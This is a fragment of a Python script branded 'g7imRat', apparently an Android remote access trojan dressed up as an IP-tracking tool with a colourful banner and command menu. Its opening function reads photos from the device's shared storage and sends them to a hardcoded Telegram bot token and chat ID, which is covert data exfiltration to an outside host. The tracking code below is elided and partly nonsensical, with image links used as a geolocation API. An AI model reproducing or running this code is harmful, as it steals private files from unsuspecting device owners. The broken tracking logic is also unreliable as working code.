...
bot = telebot.TeleBot('6988047131:AAGb2y-9Xn37qIYlD7elj8KXX3iJlaIQsT0')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id='6172841701', photo=f, caption='By:  g7imRat @g_73i')
...
| | g7imRat  | |
| |______________| |
|___________g7imRat_______|   

╚══════╝╚═╝  ╚═══╝  ╚══════╝ V1.0                                                                                                                                              
   \033[41m\x1b[1;97m##    ##  ######   ########   \33[m \n ##   ##  ##    ##  ## \033[32m          \n ##  ##   ##        ##  \033[33m         \n #####    ##   #### ######     \33[1;96m \n ##  ##   ##    ##  ##    \x1b[0;34m      \n ##   ##  ##    ##  ##    \033[95m      \n  ##    ##  ######   ##\n                                                                                                                                                       
 ==============================================
[+]Author  : g7imRat ❤            [+]
[+]Teligerm  : https://t.me/g_73i""")
    print(Fore.GREEN + """ ==============================================""")
    # print("Usage:g7imRat1 [Ip address]\n\nExample:g7imRat1 our prsnal ip")
    print(Fore.GREEN + """
    Type \"g7imRat\" to g7imRat all command """)

    def track():
        tip = input(Fore.MAGENTA + "g7imRat1 > " + Style.RESET_ALL)
        if tip == "help":
            print(Fore.BLUE + """
            g7imRat :  Its Display all commands
            g7imRat1 :  This is used for tracking an Ip address
            ...
            def get_location():
                ip_address = ip
                response = requests.get(f'https://imgur.com/bS8389o').json()
                ...
                global url
                url = "https://images.app.goo.gl/login/" + lat + "," + long + "/@" + lat + "," + long + ",16z"
